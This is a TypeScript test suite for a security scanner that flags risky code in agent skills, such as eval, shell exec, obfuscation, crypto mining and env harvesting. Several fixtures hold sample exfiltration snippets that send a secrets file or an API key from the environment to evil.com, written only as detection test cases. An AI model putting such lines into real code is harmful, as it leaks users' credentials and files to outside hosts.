/**
 * V33 Skill 安全扫描系统测试
 */

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { SkillScanner, getSkillScanner, closeSkillScanner } from "../v33-agent/scanner/engine.js";
import { LINE_RULES, SOURCE_RULES, getAllRuleIds, getRuleStats } from "../v33-agent/scanner/rules.js";
import { createScannerHandlers, SCANNER_TOOLS, SCANNER_TOOL_COUNT } from "../v33-agent/scanner/handlers.js";
import fs from "node:fs/promises";
import path from "node:path";
import os from "node:os";

describe("V33 Skill Scanner", () => {
  let scanner: SkillScanner;
  let tempDir: string;

  beforeAll(async () => {
    scanner = getSkillScanner();
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "scanner-test-"));
  });

  afterAll(async () => {
    closeSkillScanner();
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  describe("Rules", () => {
    it("should have line rules defined", () => {
      expect(LINE_RULES.length).toBeGreaterThan(0);
      for (const rule of LINE_RULES) {
        expect(rule.ruleId).toBeDefined();
        expect(rule.severity).toMatch(/^(critical|warn|info)$/);
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.message).toBeDefined();
      }
    });

    it("should have source rules defined", () => {
      expect(SOURCE_RULES.length).toBeGreaterThan(0);
      for (const rule of SOURCE_RULES) {
        expect(rule.ruleId).toBeDefined();
        expect(rule.severity).toMatch(/^(critical|warn|info)$/);
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.message).toBeDefined();
      }
    });

    it("should get all rule IDs", () => {
      const ruleIds = getAllRuleIds();
      expect(ruleIds.length).toBeGreaterThan(0);
      expect(ruleIds).toContain("dangerous-exec");
      expect(ruleIds).toContain("dynamic-code-execution");
    });

    it("should get rule statistics", () => {
      const stats = getRuleStats();
      expect(stats.total).toBeGreaterThan(0);
      expect(stats.critical).toBeGreaterThanOrEqual(0);
      expect(stats.warn).toBeGreaterThanOrEqual(0);
      expect(stats.info).toBeGreaterThanOrEqual(0);
    });
  });

  describe("Source Scanning", () => {
    it("should detect eval usage", () => {
      const source = 'const result = eval(userInput);';
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some(f => f.ruleId === "dynamic-code-execution")).toBe(true);
    });

    it("should detect child_process with context", () => {
      const source = `
        const { exec } = require('child_process');
        exec('ls -la', (err, stdout) => console.log(stdout));
      `;
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "dangerous-exec")).toBe(true);
    });

    it("should NOT trigger dangerous-exec without child_process import", () => {
      const source = 'exec("some function")'; // exec without child_process context
      const findings = scanner.scanSource(source, "test.js");
      
      // Should not trigger because there's no child_process import
      expect(findings.some(f => f.ruleId === "dangerous-exec")).toBe(false);
    });

    it("should detect crypto mining patterns", () => {
      const source = 'const pool = "stratum+tcp://pool.example.com:3333";';
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "crypto-mining")).toBe(true);
    });

    it("should detect obfuscated hex code", () => {
      const source = 'const hidden = "\\x48\\x65\\x6c\\x6c\\x6f\\x57\\x6f\\x72\\x6c\\x64";';
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "obfuscated-code")).toBe(true);
    });

    it("should detect potential exfiltration", () => {
      const source = `
        const data = readFileSync('secrets.txt');
        fetch('https://evil.com/steal', { method: 'POST', body: data });
      `;
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "potential-exfiltration")).toBe(true);
    });

    it("should detect env harvesting", () => {
      const source = `
        const apiKey = process.env.API_KEY;
        fetch('https://evil.com/steal', { body: apiKey });
      `;
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "env-harvesting")).toBe(true);
    });

    it("should NOT trigger env-harvesting without network", () => {
      const source = 'const apiKey = process.env.API_KEY;'; // Just reading env, no network
      const findings = scanner.scanSource(source, "test.js");
      
      // Should not trigger because there's no network send
      expect(findings.some(f => f.ruleId === "env-harvesting")).toBe(false);
    });

    it("should detect file system access", () => {
      const source = 'const content = readFileSync("config.json");';
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "file-system-access")).toBe(true);
    });

    it("should detect network access", () => {
      const source = 'fetch("https://api.example.com/data");';
      const findings = scanner.scanSource(source, "test.js");
      
      expect(findings.some(f => f.ruleId === "network-access")).toBe(true);
    });

    it("should return correct file and line info", () => {
      const source = `line1
line2
eval("dangerous")
line4`;
      const findings = scanner.scanSource(source, "test.js");
      
      const evalFinding = findings.find(f => f.ruleId === "dynamic-code-execution");
      expect(evalFinding).toBeDefined();
      expect(evalFinding!.line).toBe(3);
      expect(evalFinding!.file).toBe("test.js");
    });

    it("should provide evidence and suggestions", () => {
      const source = 'eval(userInput);';
      const findings = scanner.scanSource(source, "test.js");
      
      const finding = findings[0];
      expect(finding.evidence).toBeDefined();
      expect(finding.suggestion).toBeDefined();
    });
  });

  describe("File Scanning", () => {
    it("should scan a safe file", async () => {
      const safeCode = `
        export function add(a: number, b: number): number {
          return a + b;
        }
      `;
      const filePath = path.join(tempDir, "safe.ts");
      await fs.writeFile(filePath, safeCode);

      const result = await scanner.scanFile(filePath);
      
      expect(result.ok).toBe(true);
      expect(result.summary.scannedFiles).toBe(1);
      expect(result.summary.critical).toBe(0);
    });

    it("should scan a dangerous file", async () => {
      const dangerousCode = `
        const { exec } = require('child_process');
        const result = eval(userInput);
        const apiKey = process.env.API_KEY;
        fetch('https://evil.com', { body: apiKey });
      `;
      const filePath = path.join(tempDir, "dangerous.ts");
      await fs.writeFile(filePath, dangerousCode);

      const result = await scanner.scanFile(filePath);
      
      expect(result.ok).toBe(true);
      expect(result.summary.critical).toBeGreaterThan(0);
    });

    it("should handle non-existent file", async () => {
      const result = await scanner.scanFile("/non/existent/file.js");
      
      expect(result.ok).toBe(false);
      expect(result.error).toBeDefined();
    });
  });

  describe("Directory Scanning", () => {
    it("should scan a directory", async () => {
      // Create test files
      await fs.writeFile(path.join(tempDir, "file1.ts"), "export const x = 1;");
      await fs.writeFile(path.join(tempDir, "file2.ts"), "eval('dangerous');");
      
      // Create subdirectory
      const subDir = path.join(tempDir, "subdir");
      await fs.mkdir(subDir);
      await fs.writeFile(path.join(subDir, "file3.ts"), "export const y = 2;");

      const result = await scanner.scanDirectory(tempDir);
      
      expect(result.ok).toBe(true);
      expect(result.summary.scannedFiles).toBe(3);
      expect(result.summary.totalFiles).toBe(3);
      expect(result.summary.critical).toBeGreaterThan(0);
    });

    it("should skip node_modules", async () => {
      // Create node_modules directory
      const nodeModules = path.join(tempDir, "node_modules");
      await fs.mkdir(nodeModules, { recursive: true });
      await fs.writeFile(path.join(nodeModules, "package.ts"), "eval('should be skipped');");

      const result = await scanner.scanDirectory(tempDir, { skipNodeModules: true });
      
      expect(result.ok).toBe(true);
      // Should not scan node_modules
      expect(result.summary.scannedFiles).toBeLessThan(5);
    });

    it("should skip hidden files", async () => {
      const hiddenDir = path.join(tempDir, ".hidden");
      await fs.mkdir(hiddenDir, { recursive: true });
      await fs.writeFile(path.join(hiddenDir, "secret.ts"), "eval('hidden');");

      const result = await scanner.scanDirectory(tempDir, { skipHidden: true });
      
      expect(result.ok).toBe(true);
    });

    it("should respect maxFiles limit", async () => {
      // Create more files than the limit
      for (let i = 0; i < 10; i++) {
        await fs.writeFile(path.join(tempDir, `file_${i}.ts`), "export const x = 1;");
      }

      const result = await scanner.scanDirectory(tempDir, { maxFiles: 3 });
      
      expect(result.ok).toBe(true);
      expect(result.summary.scannedFiles).toBeLessThanOrEqual(3);
    });

    it("should filter by severity", async () => {
      await fs.writeFile(path.join(tempDir, "info.ts"), "readFileSync('file');"); // info level

      const result = await scanner.scanDirectory(tempDir, { 
        severityFilter: ["critical"] 
      });
      
      expect(result.ok).toBe(true);
      // Should only include critical findings
      expect(result.summary.warn).toBe(0);
      expect(result.summary.info).toBe(0);
    });

    it("should handle non-existent directory", async () => {
      const result = await scanner.scanDirectory("/non/existent/directory");
      
      expect(result.ok).toBe(false);
      expect(result.error).toBeDefined();
    });

    it("should track duration", async () => {
      const result = await scanner.scanDirectory(tempDir);
      
      expect(result.ok).toBe(true);
      expect(result.summary.duration).toBeGreaterThanOrEqual(0);
    });
  });

  describe("Tool Handlers", () => {
    let handlers: Map<string, (params: Record<string, unknown>) => Promise<any>>;

    beforeAll(() => {
      handlers = createScannerHandlers();
    });

    it("should have correct tool count", () => {
      expect(SCANNER_TOOL_COUNT).toBe(6);
    });

    it("should have all tools defined", () => {
      expect(SCANNER_TOOLS.length).toBe(6);
      const toolNames = SCANNER_TOOLS.map(t => t.name);
      expect(toolNames).toContain("scanner_scan_dir");
      expect(toolNames).toContain("scanner_scan_file");
      expect(toolNames).toContain("scanner_scan_source");
      expect(toolNames).toContain("scanner_rules");
      expect(toolNames).toContain("scanner_config");
      expect(toolNames).toContain("scanner_report");
    });

    it("should handle scanner_scan_source", async () => {
      const handler = handlers.get("scanner_scan_source");
      expect(handler).toBeDefined();

      const result = await handler!({ source: "eval('test')" });
      expect(result.ok).toBe(true);
      expect(result.result.critical).toBeGreaterThan(0);
    });

    it("should handle scanner_rules", async () => {
      const handler = handlers.get("scanner_rules");
      expect(handler).toBeDefined();

      const result = await handler!({});
      expect(result.ok).toBe(true);
      expect(result.result.total).toBeGreaterThan(0);
      expect(result.result.rules).toBeDefined();
    });

    it("should handle scanner_config", async () => {
      const handler = handlers.get("scanner_config");
      expect(handler).toBeDefined();

      const result = await handler!({});
      expect(result.ok).toBe(true);
      expect(result.result.maxFiles).toBeDefined();
      expect(result.result.extensions).toBeDefined();
    });
  });

  describe("Report Generation", () => {
    it("should generate text report", async () => {
      const handler = createScannerHandlers().get("scanner_report")!;
      const result = await handler({ 
        dirPath: tempDir, 
        format: "text" 
      });

      expect(result.ok).toBe(true);
      expect(result.result.format).toBe("text");
      expect(result.result.report).toContain("安全扫描报告");
    });

    it("should generate markdown report", async () => {
      const handler = createScannerHandlers().get("scanner_report")!;
      const result = await handler({ 
        dirPath: tempDir, 
        format: "markdown" 
      });

      expect(result.ok).toBe(true);
      expect(result.result.format).toBe("markdown");
      expect(result.result.report).toContain("# Skill 安全扫描报告");
    });

    it("should generate json report", async () => {
      const handler = createScannerHandlers().get("scanner_report")!;
      const result = await handler({ 
        dirPath: tempDir, 
        format: "json" 
      });

      expect(result.ok).toBe(true);
      expect(result.result.format).toBe("json");
      
      const parsed = JSON.parse(result.result.report);
      expect(parsed.scannedFiles).toBeDefined();
    });

    it("should optionally include info level", async () => {
      const handler = createScannerHandlers().get("scanner_report")!;
      
      const withoutInfo = await handler({ 
        dirPath: tempDir, 
        includeInfo: false 
      });
      
      const withInfo = await handler({ 
        dirPath: tempDir, 
        includeInfo: true 
      });

      // With info should potentially have more findings
      expect(withInfo.ok).toBe(true);
      expect(withoutInfo.ok).toBe(true);
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty source", () => {
      const findings = scanner.scanSource("", "empty.js");
      expect(findings).toEqual([]);
    });

    it("should handle very long lines", () => {
      const longLine = "const x = " + "a".repeat(1000);
      const findings = scanner.scanSource(longLine, "long.js");
      // Should not crash
      expect(findings).toBeDefined();
    });

    it("should truncate long evidence", () => {
      const source = "eval('" + "x".repeat(200) + "')";
      const findings = scanner.scanSource(source, "test.js");
      
      const finding = findings.find(f => f.ruleId === "dynamic-code-execution");
      expect(finding).toBeDefined();
      expect(finding!.evidence.length).toBeLessThanOrEqual(123); // 120 + "…"
    });

    it("should handle unicode in source", () => {
      const source = "const 你好 = '世界'; eval(你好);";
      const findings = scanner.scanSource(source, "unicode.js");
      
      expect(findings.some(f => f.ruleId === "dynamic-code-execution")).toBe(true);
    });

    it("should detect multiple issues in one file", () => {
      const source = `
        eval(userInput);
        exec('command');
        const apiKey = process.env.KEY;
        fetch('https://evil.com', { body: apiKey });
      `;
      const findings = scanner.scanSource(source, "multi.js");
      
      expect(findings.length).toBeGreaterThan(1);
    });
  });
});
